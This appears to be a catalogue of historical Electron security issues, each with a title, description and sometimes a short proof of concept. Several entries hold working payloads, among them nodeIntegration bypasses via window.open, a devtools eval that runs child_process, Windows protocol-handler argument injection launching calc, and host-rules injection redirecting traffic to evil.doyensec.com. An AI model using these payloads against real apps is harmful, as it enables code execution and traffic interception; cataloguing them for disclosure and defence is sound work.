title: System library locations in `Module.globalPaths`
description: Electron's module includes system paths from search. Since a user may have many additional npm packages downloaded in the local user folder, this bug can facilitate exploitation. Path could contain modules not shipped with the actual application.
PoC_A: require('module').globalPaths

title: Executable Stack Set
description: The prebuilt electron binary has an executable stack, which results in their being more vulnerable to exploitation via stack memory. This may increase the likelihood of successful exploitation via stack memory corruption bugs.

title: NodeIntegration Bypass #1
description: Disable node integration in child windows opened with `window.open` when node integration is disabled in parent window.
PoC_A:
<script>
window.open("http://127.0.0.1:8000/index2.html", "","nodeIntegration=1");
</script>

title: NodeIntegration Bypass #2
description: Before this fix, node integration on a `<webview>` could be enabled even when the parent did not have it. Now `nodeIntegration` inheritance will behave consistently across `<webview>` tags and `window.open` windows.
PoC_A: <webview nodeintegration src="http://127.0.0.1:8000/index2.html"></webview>

title: NodeIntegration Bypass #3
description: Fixed an issue where the `window.opener` API did not behave as expected. Applicable when node integration is disabled in the opened window but enabled on the parent window.
PoC_A:
<script>
window.opener.eval('window.open("http://127.0.0.1:8000/index3.html", "", "nodeIntegration=yes")');
</script>

title: NodeIntegration Bypass #4
description: Fixed an issue where the `window.opener` API did not behave as expected. Abusing `Function.prototype.call`, it's possible to access the `BrowserWindow` constructor to create a new window with integration enabled. Applicable when node integration is disabled in the opened window but enabled on the parent window.

title: NodeIntegration Bypass #5
description: Fixed an issue where `window.alert`, `window.close`, and `window.confirm` did not behave as expected. Other abuses of `Function.prototype.call`, `Array.prototype.push`, `Function.prototype.apply` were fixed.

title: Symantec, GeoTrust, and Thawte SSL/TLS certificates rejection
description: Fixed an issue where certain certificates would be incorrectly rejected when making HTTPS requests. This was an upstream Chrome fix that is time-sensitive where affected certificates will be rejected starting 10 weeks after the time of the Electron release.

title: NodeIntegration Bypass #6
description: Node’s `Buffer` class is no longer available on the window global when Node integration is disabled. On an older version of node, several ways to get access to other node internals were discovered through the prototype of `Buffer` or using `Buffer.allocUnsafe()`. This was fixed through the Node-Electron's fork.

title: NodeIntegration Bypass #7
description: Fixed an issue where `chrome-devtools:` URLs would incorrectly override certain window options. Initially disclosed to Electron on May 10, the issue was marked as Duplicate. The same issue occurs by referencing the new window with `win.location="chrome-devtools://devtools/bundled/"`.
PoC_A:
<script>
const win = window.open("chrome-devtools://devtools/bundled/ inspector.html");
win.eval("const execFile = require('child_process').execFile; const child = execFile('touch', ['/tmp/electronegativity'], (error, stdout, stderr) => {});");
</script>

title: JavaScript Support Can Be Re-Enabled on new Windows
description: The `javascript` option was disabled in windows opened from a window that already has it disabled, similarly to the `nodeIntegration` option behavior.
PoC_A: Click Me No JavaScript Here

title: Abuse in `postMessage` Origin Bypass
description: Fixed an issue when using `postMessage` across windows where the `targetOrigin` parameter was not correctly compared against the source origin.
PoC_A: This can be exploited by using a subdomain that contains the string of the targeted domain

title: Denial of Service via Unhandled Exceptions
description:
Fixed an issue where certain built-in window APIs like `alert`, `confirm`, `open`, `history.go`, and `postMessage` would throw errors in the main process instead of the renderer processes when the arguments were invalid.
Fixed an issue where specifying `webPreferences` in the features parameter to `window.open` would throw an error in the main process.
Fixed an issue where certain valid frame names passed to `window.open` would throw errors in the main process.
PoC_A:
<script>
alert({toString:null});
</script>

title: Cross-Site Scripting in Default App
description: Fixed an issue where the default app could render incorrectly depending on the path Electron was installed into.
PoC_A:
This can be exploited by opening the Electron-Quick-Start app in a folder containing HTML chars (e.g. /Users/ikki/

AAAA/)

title: StartCom and WoSign certificates not invalidated
description: Backported an upstream Node.js fix where StartCom and WoSign certificates are now rejected when making HTTPS requests.

title: HTML File Object Path Attribute Disclosure
description:
HTML5 File API capabilities were extended in Electron with the `path` attribute.
This extended behavior is still exposed even with `sandbox:true` and `nodeIntegration:false`. Path disclosure can lead to sensitive directory names being leaked to restricted renderers.

title: Denial of Service via Custom HTTP Protocol
description: A bug in Electron when using custom HTTP protocols was identified, triggering a IO thread crash. Since the issue affects the HTTP protocol handler, it can be triggered from untrusted pages if/when an affected app loads untrusted content.

title: The `file://` Handler Can Be Abused to Read Arbitrary Files
description:
Electron does not restrict the `file://` handler even from web origins, thus a remote untrusted page can read the content of local resources.
Using `smb` and `window.open`/`window.eval`, an attacker does not even require to have a malicious local page stored on the user's computer.

title: `SameOriginPolicy` Bypass
description: Electron `window.open` API allows SOP bypass using different techniques. This issue can be leveraged to obtain RCE using a NodeIntegration Bypass.
PoC_A:
<script>
win = window.open("doyensec.com");
win.location = "javascript:alert(document.domain)";
</script>

title: CSP Sandbox still allows Modal
description: Setting the sandbox CSP directive still allows `alert`, `confirm`, and `window.open` to be called from a `BrowserWindow`, which it should not. Now all modals are now routed through `AtomJavascriptDialogManager` (and therefore have the same CSP protections as `nativeWindowOpen`).
PoC_A: This issue can be reproduced by setting a CSP Policy (Content-Security-Policy: sandbox allow-scripts) and then e.g. alert() on the HTML page

title: Exceptions System Path and Username Information Leak
description: Electron's stack traces can be accessed by JavaScript on remote websites. It means that arbitrary pages that are loaded on an electron app can leak system paths and usernames. The issue was partially addressed, but other functions/exceptions may be leveraged to obtain similar results.
PoC_A:
<script>
try{
alert(1,1);
} catch(e){
console.log(e.message);
e.message.match(/:\\Users\\(.*)\\AppData/);
alert(RegExp.$1);
}
</script>

title: NodeIntegration Bypass #8
description: Fixed an issue where windows using `nativeWindowOpen` could lose their configured `webContents` options when navigating URLs.

title: Chromium v59 RCE affecting Electron
description:
A remote code execution vulnerability together with the full exploit code was released by SecuriTeam SSD on August 16, 2017. 
A fix was released in 1.7.8 and 1.6.14 that didn't cover older versions of Chromium (used in older branches of Electron), thus a new version was released after. The first update for this bug was released on September 24, 2017. As stated, __"1.7.8 and 1.6.14 patches were insufficient to address the RCE issue in those Chromium versions"__.

title: Windows Protocol handler RCE bug
description:
A remote code execution vulnerability has been discovered affecting Electron apps that use custom protocol handlers. Insufficient arguments sanitization is performed in Electron, since it is possible to inject a quote followed by additional Chromium/Node arguments. Electron apps designed to run on Windows that register themselves as the default handler for a protocol, like `myapp://`, are vulnerable.
This issue was originally fixed in v1.7.11 and v1.6.16 but without considering that arguments could also be UPPERCASED.
PoC_A:
<script>
win.location = 'myapp://foobar" --gpu-launcher="cmd c/ start calc" --foobar='
</script>
PoC_B:
Or with bypass
<script>
win.location = 'myapp://foobar" --GPU-launcher="cmd c/ start calc" --foobar='
</script>

title: Chromium v63 WebAssembly UXSS
description: A universal XSS vulnerability affected Chromium until v63. This cross-site scripting vulnerability was present in `WebAssembly.compileStreaming`.

title: hoek package (Electron dependency) Prototype Pollution
description: Electron's nested dependency _"hoek"_ was affected by a typical prototype pollution vulnerability. The utilities function allow modification of the `Object` prototype. If an attacker can control part of the structure passed to this function, they could add or modify an existing property. The hoek library was used as a subdependency of the electron-download library used by the electron-prebuilt and electron-packager libraries to download the Electron release achives from GitHub. The hawk library was used to handle the HTTP Hawk Authentication Scheme. The impact of this issue is very limited and only affects development-related code.

title: `shell.openExternal` leaks environmental variables to child processes
description:
`shell.openExternal` opens target processes as true child processes and passes the console. In practice, that means that environment variables set for your app are passed to the child processes.
This behaviour affect Windows-only.
PoC_A:
Your app sets process.env.NODE_ENV="development"
Now, using shell.openExternal, you open a link (https://google.com)
If the system's default browser wasn't already running, it will now be launched with NODE_ENV="development"

title: Missing Code Integrity Checks
description: Electron does not implement any form of integrity check in all of its versions. Consequently, any Electron app can therefore be abused to run unsigned code. While different code signing mitigations have been proposed and discussed (#9648), no comphrensive integrity protection is provided by the framework. Some degree of protection could by provided by publishing the app to the Windows Store or Apple App Store. Consider doing so depending on the application's security requirements.

title: DOM-Based XSS in `content_scripts`
description: This update fixes a DOM XSS via innerHTML in `/lib/renderer/content-scripts-injector.js` when injecting stylesheets.

title: Windows Protocol handler RCE bug (Bypass of CVE-2018-1000006)
description:
As part of a customer engagement, we analyzed the patch for CVE-2018-1000006 (Electron Windows Protocol handler RCE bug) and identified a bypass. Under certain circumstances, this bypass leads to session hijacking and remote code execution triggered by simply visiting a web page from a browser.
Electron apps designed to run on Windows that register themselves as the default handler for a protocol and do not prepend dash-dash in the registry entry are affected.
An attacker could exploit this issue by overriding the host definitions in order to perform silent Man-In-The-Middle. Since the connection is made to the attacker-controlled host, certificate validation does not help here. At this point, the attacker can steal session tokens, confidential data or tamper responses to trigger XSS -> RCE attacks on the client-side. Please note that it is only possible to intercept traffic generated by chromium, and not node. For this reason, Electron’s update and other critical functionalities using HTTP(S) connections are not affected by this issue.
PoC_A:
<!doctype html>
<script>
 window.location = 'skype://ldoyensec.testing?userinfo" --host-rules="MAP * evil.doyensec.com" --foobar='
</script>

title: Drag&Drop Content Across Privileged Boundaries
description: Electron supports drag&drop between web contexts by default. This feature allows content (e.g. a link) from an un-privileged `BrowserWindow` to be dropped into a privileged browser window (having node integration).
PoC_A: ust create two BrowserWindow(s): one with nodeIntegration, one without. Drag a link (e.g. http) from the isolated to the open BrowserWindow.

title: WebRTC: Out-of-bounds memory access
description: This Electron version is affected by a missing check in VP9 frame processing that could lead to memory corruption.
PoC_A: PoC (crash) provided in the original P0 bug

title: NodeIntegration Bypass #10
description:
A NodeIntegration Bypass when `nativeWindow` is on is present on this Electron version.
The issue was originally discovered by Matt Austin, although he thought that Google's code was at fault.
PoC_A:
Affects:

          "nodeIntegration": false,
          "nativeWindowOpen": true //or sandbox: true

PoC:
window.open('about:blank').open('data:text/html,<script>document.write(process.cwd())</script>')

title: NodeIntegration Bypass #11 (Electron prototype pollution)
description:
Prototype pollution attacks are always possible when context isolation is not used. This Electron version does not support context isolation, and the options necessary to prevent this attack are only available from Electron v1.4.15. By enabling `contextIsolation`, any prototype pollution based attack won't impact Electron internals.
When mounting this attack it's usually possible via `Function.prototype.call`, granting access to the `process` module and its `require` function.
PoC_B:
Another great example by Matt Austin:

Click

title: Windows Protocol handler RCE bug (Bypass of CVE-2018-1000006)
description: Another bypass for CVE-2018-1000006 (Electron Windows Protocol handler RCE bug). An attacker can use the same vector to open Electron with the node inspector and then use DNS rebinding to access the insecure interface in order to execute commands.
PoC_A:
<!doctype html>
<script>

</script>

This brings Electron under debugging at port 5555. Using a DNS rebinding attack, it is possible to connect to the port 5555 and use the inspector protocol to hijack the local machine

title: Type Confusion in `Promise.all`
description: A type confusion bug in V8 exists in this Electron version.

title: NodeIntegration Bypass #12
description: A vulnerability that allowed Node to be re-enabled in child Windows was fixed after these versions. Opening a `BrowserView` with `sandbox: true` or `nativeWindowOpen: true` and `nodeIntegration: false` results in a `webContents` where `window.open` can be called and the newly opened child window will have `nodeIntegration` enabled. title: Potential Buffer Overflow in `nativeImage`
description: Added missing buffer size check in `nativeImage.createFromBuffer` / `nativeImage.addRepresentation`. Data URLs only parsed according to the MIME type as PNG or JPEG.

title: Chromium's Heap-use-after-free fix
description: A backported fix for `Heap-use-after-free` in `content::KeyboardLockServiceImpl::GetKeyboardLayoutMap` exists #888678. `KeyboardLockServiceImpl` takes a raw pointer to a `RenderFrameHost` but doesn't observe the destruction of the `RenderFrameHost`. Nothing guarantees that `KeyboardLockServiceImpl` won't outlive the `RenderFrameHost` (#17632).

title: Chromium's Multiple Memory Corruption fixes
description:
Backported fixes after a ClusterFuzz run of Chromium:
* QUIC proxying breaks end-to-end encryption #914497
* Heap buffer overflow in the V8 language parser #914736
* Type Confusion in `LayoutBlockFlow::CreateLineBoxes` #915469 
* UAF in `FileSystemOperationRunner` #925864
* heap-use-after-free on `sw::Renderer::finishRendering` #904714
* V8: Incorrect type information on `SpeculativeSafeIntegerSubtract` #913296

title: Chromium's Multiple Memory Corruption fixes
description:
Backported fixes after a ClusterFuzz run of Chromium:

* Fix for OOB Write in `ValueDeserializer::ReadDenseJSArray` (Tian Fu Cup exploit) #905940. #18565
* Fix for UAP in `blink::FileReaderLoader::OnStartLoading` #913970. #18563
* Fix for a bug that allows invalid data to be processed by the message deserializer, which exposes its attack surface. The issue originally reported as bug 905940 used this bug to inject corrupt data into the deserializer, and then exploited another bug (fixed in 905940) to write out of bounds. So this bug isn't itself massive per se, but fixing it would have made exploiting 905940 more difficult. #914731. #18562
* Fix for DCHECK failure in `IsAligned(DistanceTo(target), kInstrSize)` #924843. #18530
* Fix for OOB write in `sw::VertexProgram::Program` #915206
* Fix for OOB operation in SwiftShader JIT code #915218. #18567

title: Command-line Scheme Switches Pollution
description: Fixed command-line scheme arguments from spilling over into each other. Passing additional schemes on the command line, e.g. `--standard-schemes=foo,bar,mum,` should not affect other schemes, e.g. CORS-enabled schemes or secure schemes.

title: Chromium's fix for a `MojoCdmService` security issue
description: Added more safety checks in the `MojoCdmService`

title: Potential Sandboxed Preloads Globals Leaks in window
description: This change re-adds the preload wrapping Electron used to have for sandboxed renderers that was accidentally removed as part of C71. This may lead to `nodeIntegration` bypasses when `sandbox` is used with weak preloads.

title: Chromium's UAF in OfflineAudioContext (WebAudio)
description: Backported `WebAudio` security patch from Chromium upstream.

title: Chromium's Multiple Memory Corruption fixes
description:
The following Chromium fixes were backported:
* Fixed an OOB access in ReadableStream::Close` (crbug.com/1045931). #22436
* Fixed an integer overflow crash in ICU (crbug.com/1044570). #22422

title: `safeDialog` For Popups Not Implemented
description: Fixed an issue with `safeDialog preferences` not being passed properly. An attacker could abuse this to lock the interface by opening infinite dialogs (e.g. infinite `alert()`)

title: Broken `will-navigate` event not emitted for sandboxed contents
description:
The `will-navigate` event is not emitted for sandboxed contents. The bug could break security features based on this. #22188
The issue is reproducible in every Electron version since the introduction of the sandbox flag (in v1.4.2) up to the 8.0.2 Electron release.

title: NodeIntegration Bypass #13
description:
Two extra globals, namely `window.root` and `window.GLOBAL` are recursive references to the original global object. I.e. `window.root === window
window.root` and `window.GLOBAL` are both now `undefined` when `nodeIntegration` is disabled as expected.

title: contextIsolation Bypass #14
description: The `Proxy` object is not created in the correct context. In Electron.js, the `contextBridge` module uses the `CreateProxyForAPI` method in conjunction with the V8 bindings and its various scope utilities (`destination_context_scope`) to mediate access to the V8 `Isolate` and the various items on its heap (local/global handles, return/escape slots, etc.), therefore providing isolation. In versions before 8.2.3, the `Proxy` object was not created in the correct context, creating a flaw that could result in cross-context prototype pollution, consequently breaking context isolation. Using unpatched Electron versions may result in cross-context prototype pollution, breaking context isolation.

title: `nativeWindowOpen` hardening
description: This prevents windows that have `nativeWindowOpen: true` (or `sandbox: true` which implies it) from being able to use the `ELECTRON_GUEST_WINDOW_MANAGER_WINDOW_OPEN` ipc event, which handles non-native `window.open` calls. The `ELECTRON_GUEST_WINDOW_MANAGER_WINDOW_OPEN` ipc should only be allowed for senders that have `nativeWindowOpen: false`.

title: Context isolation bypass via `Promise.then` bug in V8
description: Applications using `contextIsolation` are affected. This is a context isolation bypass, meaning that code running in the main world context in the renderer can reach into the isolated Electron context and perform privileged actions.

title: Context isolation bypass via leaked cross-context objects
description:

Root cause is that renderers' child windows could specify their own preload scripts

title: Context isolation bypass via contextBridge

title: Context isolation bypass using unpreventable top-level navigation
description: Apps using both `contextIsolation` and `sandbox` set to `true` are affected. Apps using both `contextIsolation` and `nativeWindowOpen` set to true are also affected. This is a context isolation bypass, meaning that code running in the main world context in the renderer can reach into the isolated Electron context and perform privileged actions.

title: Override of Parent's Web Preferences Via `window.open`
description:
A child window opened with `window.open` can override its web preferences inherited from the parent window. Additionally, the the feature string in `window.open` is treated as `windowOpenOverriddenOptions` which would override the `securityWebPreferences`

In order to reproduce the issue:
1. Create a `BrowserWindow` with `nativeWindowOpen` enabled and `nodeIntegration` enabled.
2. Open a popup using `window.open('popup.html', '', 'nodeIntegration=no');`. The resulting window will have `nodeIntegration` enabled.

title: `window.open` not overriding parent's `webPreferences`
description:
Child window opened with `window.open` can not override its web preferences inherited from the parent window. This means that if a `BrowserWindow` has `nativeWindowOpen` enabled and `nodeIntegration` enabled, opening a popup with `window.open('popup.html', '', 'nodeIntegration=no');` to have `nodeIntegration` disabled won't work. The popup window will have `nodeIntegration` enabled incorrectly. However, when the parent window has `nativeWindowOpen` disabled, the issue doesn't occur.

The root cause of this issue is, when a child window is created with `window.open`, Chromium will load an empty page in it immediately in renderer, which bypasses browser side navigation and Electron doesn't have a chance to override the child window's WebPreferences. So when the empty page is loaded in the child window, its parent's `webPreferences` will be used and the child window will have node integration enabled in it.

title: Arbitrary file read via window-open IPC
description: The vulnerability allows arbitrary local file read by defining unsafe window options on a child window opened via `window.open`.

title: Sandboxed renderers can obtain thumbnails of arbitrary files through the nativeImage API
description: This vulnerability allows a sandboxed renderer to request a "thumbnail" image of an arbitrary file on the user's system. The thumbnail can potentially include significant parts of the original file, including textual data in many cases.

title: Renderers can obtain access to random bluetooth device without permission
description: This vulnerability allows renderers to obtain access to a random bluetooth device via the web bluetooth API if the app has not configured a custom `select-bluetooth-device` event handler. The device that is accessed is random and the attacker would have no way of selecting a specific device.

title: Compromised child renderer processes could obtain IPC access without nodeIntegrationInSubFrames being enabled
description:
This vulnerability allows a renderer with JS execution to obtain access to a new renderer process with `nodeIntegrationInSubFrames` enabled which in turn allows effective access to `ipcRenderer`.

Please note the misleadingly named `nodeIntegrationInSubFrames` option does not implicitly grant Node.js access rather it depends on the existing `sandbox` setting. If your application is sandboxed then `nodeIntegrationInSubFrames` just gives access to the sandboxed renderer APIs (which includes `ipcRenderer`).

If your application then additionally exposes IPC messages without IPC `senderFrame` validation that perform privileged actions or return confidential data this access to `ipcRenderer` can in turn compromise your application / user even with the sandbox enabled.

title: AutoUpdater module fails to validate certain nested components of the bundle on macOS
description:
This vulnerability allows attackers who have control over a given apps update server / update storage to serve maliciously crafted update packages that pass the code signing validation check but contain malicious code in some components.

Please note that this kind of attack would require significant privileges in your own auto updating infrastructure and the ease of that attack entirely depends on your infrastructure security.

title: Exfiltration of hashed SMB credentials on Windows via file:// redirect
description: When following a redirect, Electron delays a check for redirecting to file:// URLs from other schemes. The contents of the file is not available to the renderer following the redirect, but if the redirect target is a SMB URL such as `file://some.website.com/`, then in some cases, Windows will connect to that server and attempt NTLM authentication, which can include sending hashed credentials.

title: Content-Secrity-Policy disabling eval not applied consistently in renderers with sandbox disabled
description:
A Content-Security-Policy that disables eval, specifically setting a `script-src` directive and not providing `unsafe-eval` in that directive, is not respected in renderers that have sandbox and contextIsolation disabled. i.e. `sandbox: false` and `contextIsolation: false` in the `webPreferences` object.

This resulted in incorrectly allowing usage of methods like `eval()` and `new Function`, which can result in an expanded attack surface.

title: Context isolation bypass via nested unserializable return value
description:
Apps using `contextIsolation` and `contextBridge` are affected.

This is a context isolation bypass, meaning that code running in the main world context in the renderer can reach into the isolated Electron context and perform privileged actions.

title: Out-of-package code execution when launched with arbitrary cwd
description:
Apps that are launched as command line executables are impacted. E.g. if your app exposes itself in the path as `myapp --help`

Specifically this issue can only be exploited if the following conditions are met:

 - Your app is launched with an attacker-controlled working directory
 - The attacker has the ability to write files to that working directory

This makes the risk quite low, in fact normally issues of this kind are considered outside of Electron's threat model as similar to Chromium Physically Local Attacks are excluded but given the ability for this issue to bypass certain protections like ASAR Integrity it is being treated with higher importance.

title: ASAR Integrity bypass via filetype confusion
description:
This only impacts apps that have the `embeddedAsarIntegrityValidation` and `onlyLoadAppFromAsar` fuses enabled. Apps without these fuses enabled are not impacted. This issue is specific to macOS as these fuses are only currently supported on macOS.

Specifically this issue can only be exploited if your app is launched from a filesystem the attacker has write access too. i.e. the ability to edit files inside the `.app` bundle on macOS which these fuses are supposed to protect against.

title: Heap Buffer Overflow in NativeImage::CreateFromPath
description: The `nativeImage.createFromPath()` and `nativeImage.createFromBuffer()` functions call a function downstream that is vulnerable to a heap buffer overflow. An Electron program that uses either of the affected functions is vulnerable to a buffer overflow if an attacker is in control of the image's height, width, and contents.

title: ASAR Integrity bypass by just modify the content
description:
This only impacts apps that have the `embeddedAsarIntegrityValidation` and `onlyLoadAppFromAsar` [fuses](https://www.electronjs.org/docs/latest/tutorial/fuses) enabled. Apps without these fuses enabled are not impacted. This issue is specific to Windows, apps using these fuses on macOS are unimpacted.

Specifically this issue can only be exploited if your app is launched from a filesystem the attacker has write access too. i.e. the ability to edit files inside the .app bundle on macOS which these fuses are supposed to protect against.

title: ASAR Integrity Bypass via resource modification
description:
This only impacts apps that have the `embeddedAsarIntegrityValidation` and `onlyLoadAppFromAsar` [fuses](https://www.electronjs.org/docs/latest/tutorial/fuses) enabled.  Apps without these fuses enabled are not impacted.

Specifically this issue can only be exploited if your app is launched from a filesystem the attacker has write access too.  i.e. the ability to edit files inside the `resources` folder in your app installation on Windows which these fuses are supposed to protect against.

title: HTTP Response Header Injection in custom protocol handlers and webRequest
description:
Apps that register custom protocol handlers via `protocol.handle()` / `protocol.registerSchemesAsPrivileged()` or modify response headers via `webRequest.onHeadersReceived` may be vulnerable to HTTP response header injection if attacker-controlled input is reflected into a response header name or value.

An attacker who can influence a header value may be able to inject additional response headers, affecting cookies, content security policy, or cross-origin access controls.

Apps that do not reflect external input into response headers are not affected.

title: USB device selection not validated against filtered device list
description:
The `select-usb-device` event callback did not validate the chosen device ID against the filtered list that was presented to the handler. An app whose handler could be influenced to select a device ID outside the filtered set would grant access to a device that did not match the renderer's requested `filters` or was listed in `exclusionFilters`.

The WebUSB security blocklist remained enforced regardless, so security-sensitive devices on the blocklist were not affected. The practical impact is limited to apps with unusual device-selection logic.

title: Unquoted executable path in app.setLoginItemSettings on Windows
description:
On Windows, `app.setLoginItemSettings({openAtLogin: true})` wrote the executable path to the `Run` registry key without quoting. If the app is installed to a path containing spaces, an attacker with write access to an ancestor directory may be able to cause a different executable to run at login instead of the intended app.

On a default Windows install, standard system directories are protected against writes by standard users, so exploitation typically requires a non-standard install location.

title: Use-after-free in PowerMonitor on Windows and macOS
description:
Apps that use the `powerMonitor` module may be vulnerable to a use-after-free. After the native `PowerMonitor` object is garbage-collected, the associated OS-level resources (a message window on Windows, a shutdown handler on macOS) retain dangling references. A subsequent session-change event (Windows) or system shutdown (macOS) dereferences freed memory, which may lead to a crash or memory corruption.

All apps that access `powerMonitor` events (`suspend`, `resume`, `lock-screen`, etc.) are potentially affected. The issue is not directly renderer-controllable.

title: Renderer command-line switch injection via undocumented commandLineSwitches webPreference
description:
An undocumented `commandLineSwitches` webPreference allowed arbitrary switches to be appended to the renderer process command line. Apps that construct `webPreferences` by spreading untrusted configuration objects may inadvertently allow an attacker to inject switches that disable renderer sandboxing or web security controls.

Apps are only affected if they construct `webPreferences` from external or untrusted input without an allowlist. Apps that use a fixed, hardcoded `webPreferences` object are not affected.

title: Use-after-free in WebContents fullscreen, pointer-lock, and keyboard-lock permission callbacks
description:
Apps that register an asynchronous `session.setPermissionRequestHandler()` may be vulnerable to a use-after-free when handling fullscreen, pointer-lock, or keyboard-lock permission requests. If the requesting frame navigates or the window closes while the permission handler is pending, invoking the stored callback dereferences freed memory, which may lead to a crash or memory corruption.

Apps that do not set a permission request handler, or whose handler responds synchronously, are not affected.

title: Use-after-free in download save dialog callback
description:
Apps that allow downloads and programmatically destroy sessions may be vulnerable to a use-after-free. If a session is torn down while a native save-file dialog is open for a download, dismissing the dialog dereferences freed memory, which may lead to a crash or memory corruption.

Apps that do not destroy sessions at runtime, or that do not permit downloads, are not affected.

title: Use-after-free in offscreen child window paint callback
description:
Apps that use offscreen rendering and allow child windows via `window.open()` may be vulnerable to a use-after-free. If the parent offscreen `WebContents` is destroyed while a child window remains open, subsequent paint frames on the child dereference freed memory, which may lead to a crash or memory corruption.

Apps are only affected if they use offscreen rendering (`webPreferences.offscreen: true`) and their `setWindowOpenHandler` permits child windows. Apps that do not use offscreen rendering, or that deny child windows, are not affected.

title: Registry key path injection in app.setAsDefaultProtocolClient on Windows
description:
On Windows, `app.setAsDefaultProtocolClient(protocol)` did not validate the protocol name before writing to the registry. Apps that pass untrusted input as the protocol name may allow an attacker to write to arbitrary subkeys under `HKCU\Software\Classes\`, potentially hijacking existing protocol handlers.

Apps are only affected if they call `app.setAsDefaultProtocolClient()` with a protocol name derived from external or untrusted input. Apps that use a hardcoded protocol name are not affected.

title: Out-of-bounds read in second-instance IPC on macOS and Linux
description:
On macOS and Linux, apps that call `app.requestSingleInstanceLock()` were vulnerable to an out-of-bounds heap read when parsing a crafted second-instance message. Leaked memory could be delivered to the app's `second-instance` event handler.

This issue is limited to processes running as the same user as the Electron app.

Apps that do not call `app.requestSingleInstanceLock()` are not affected. Windows is not affected by this issue.

title: Incorrect origin passed to permission request handler for iframe requests
description:
When an iframe requests `fullscreen`, `pointerLock`, `keyboardLock`, `openExternal`, or `media` permissions, the origin passed to `session.setPermissionRequestHandler()` was the top-level page's origin rather than the requesting iframe's origin. Apps that grant permissions based on the origin parameter or `webContents.getURL()` may inadvertently grant permissions to embedded third-party content.

The correct requesting URL remains available via `details.requestingUrl`. Apps that already check `details.requestingUrl` are not affected.

title: nodeIntegrationInWorker not correctly scoped in shared renderer processes
description:
The `nodeIntegrationInWorker` webPreference was not correctly scoped in all configurations. In certain process-sharing scenarios, workers spawned in frames configured with `nodeIntegrationInWorker: false` could still receive Node.js integration.

Apps are only affected if they enable `nodeIntegrationInWorker`. Apps that do not use `nodeIntegrationInWorker` are not affected.

title: AppleScript injection in app.moveToApplicationsFolder on macOS
description:
On macOS, `app.moveToApplicationsFolder()` used an AppleScript fallback path that did not properly handle certain characters in the application bundle path. Under specific conditions, a crafted launch path could lead to arbitrary AppleScript execution when the user accepted the move-to-Applications prompt.

Apps are only affected if they call `app.moveToApplicationsFolder()`. Apps that do not use this API are not affected.

title: Service worker can spoof executeJavaScript IPC replies
description:
A service worker running in a session could spoof reply messages on the internal IPC channel used by `webContents.executeJavaScript()` and related methods, causing the main-process promise to resolve with attacker-controlled data.

Apps are only affected if they have service workers registered and use the result of `webContents.executeJavaScript()` (or `webFrameMain.executeJavaScript()`) in security-sensitive decisions.

title: Context Isolation bypass via contextBridge VideoFrame transfer
description:
Apps that pass `VideoFrame` objects (from the WebCodecs API) across the `contextBridge` are vulnerable to a context isolation bypass. An attacker who can execute JavaScript in the main world (for example, via XSS) can use a bridged `VideoFrame` to gain access to the isolated world, including any Node.js APIs exposed to the preload script.

Apps are only affected if a preload script returns, resolves, or passes a `VideoFrame` object to the main world via `contextBridge.exposeInMainWorld()`. Apps that do not bridge `VideoFrame` objects are not affected.

title: Use-after-free in offscreen shared texture release() callback
description:
Apps that use offscreen rendering with GPU shared textures may be vulnerable to a use-after-free. Under certain conditions, the `release()` callback provided on a `paint` event texture can outlive its backing native state, and invoking it after that point dereferences freed memory in the main process, which may lead to a crash or memory corruption.

Apps are only affected if they use offscreen rendering with `webPreferences.offscreen: { useSharedTexture: true }`. Apps that do not enable shared-texture offscreen rendering are not affected.

title: Named window.open targets not scoped to the opener's browsing context
description:
When a renderer calls `window.open()` with a target name, Electron did not correctly scope the named-window lookup to the opener's browsing context group. A renderer could navigate an existing child window that was opened by a different, unrelated renderer if both used the same target name. If that existing child was created with more permissive `webPreferences` (via `setWindowOpenHandler`'s `overrideBrowserWindowOptions`), content loaded by the second renderer inherits those permissions.

Apps are only affected if they open multiple top-level windows with differing trust levels **and** use `setWindowOpenHandler` to grant child windows elevated `webPreferences` such as a privileged preload script. Apps that do not elevate child window privileges, or that use a single top-level window, are not affected.

Apps that additionally grant `nodeIntegration: true` or `sandbox: false` to child windows (contrary to the [security recommendations](https://www.electronjs.org/docs/latest/tutorial/security)) may be exposed to arbitrary code execution.

title: Crash in clipboard.readImage() on malformed clipboard image data
description:
Apps that call `clipboard.readImage()` may be vulnerable to a denial of service. If the system clipboard contains image data that fails to decode, the resulting null bitmap is passed unchecked to image construction, triggering a controlled abort and crashing the process.

Apps are only affected if they call `clipboard.readImage()`. Apps that do not read images from the clipboard are not affected. This issue does not allow memory corruption or code execution.

title: Buffer performs incorrect byte length calculations resulting in heap buffer under/overflow
description: Most apps will crash and some may perform incorrect buffer allocations in the Node.js `Buffer` API resulting in unexpected truncation or allocation.

title: Sandboxed iframe can bypass the allow-popups restriction via the OpenURL navigation path
description:
A sandboxed iframe without the `allow-popups` keyword could still open a new window (or trigger `setWindowOpenHandler`) with no user interaction, because new-window navigations taking the OpenURL path did not apply the iframe sandbox popup restriction.

Apps that embed untrusted content in sandboxed iframes and rely on the absence of `allow-popups` to prevent window creation are affected. Apps that deny window creation in `setWindowOpenHandler`, or that do not embed untrusted content in sandboxed iframes, are not affected.

title: shell.openPath path validation bypass via embedded null byte
description:
`shell.openPath()` did not reject paths containing embedded null bytes. Apps that perform string-only validation of file paths (for example, checking the file extension) before passing them to `shell.openPath()` could be bypassed, allowing an attacker-controlled path to open a different file than the one that passed validation.

Apps are only affected if they pass paths derived from untrusted input to `shell.openPath()` and rely on string-based validation without a filesystem check. Node's `fs` APIs already reject paths containing null bytes, so apps that call `fs.existsSync()`, `fs.stat()`, or similar before `shell.openPath()` are not affected. Apps that do not call `shell.openPath()` with untrusted input are not affected.

title: Custom protocol with supportFetchAPI but not corsEnabled allows cross-origin reads
description:
A custom scheme registered with `supportFetchAPI: true` but without `corsEnabled: true` was not subject to CORS enforcement. A page loaded from a remote origin could therefore `fetch()` or `XMLHttpRequest` that scheme cross-origin and read the full response body, rather than the read being blocked.

Apps are only affected if they register such a scheme, serve sensitive data from it, and load untrusted content in the same session. Apps that do not load untrusted content are not affected. Schemes registered with `corsEnabled: true` are unchanged by this fix: that option opts the scheme in to cross-origin `fetch()`, and responses from its handler are readable by any origin in the session by design.

title: ProtocolResponse.url reuses the default session cache instead of the registering session
description:
When a custom protocol handler returned a `ProtocolResponse` with a `url` and no `session`, Electron made the upstream request through `defaultSession` instead of the session that handled the protocol. A cached response could then be reused across otherwise isolated session partitions.

Apps that use `ProtocolResponse.url`, omit `ProtocolResponse.session`, and rely on separate sessions to isolate content are affected. Apps that set an explicit `session`, or that do not isolate content across sessions, are not affected.

title: Context isolation bypass via prototype hijack
description:
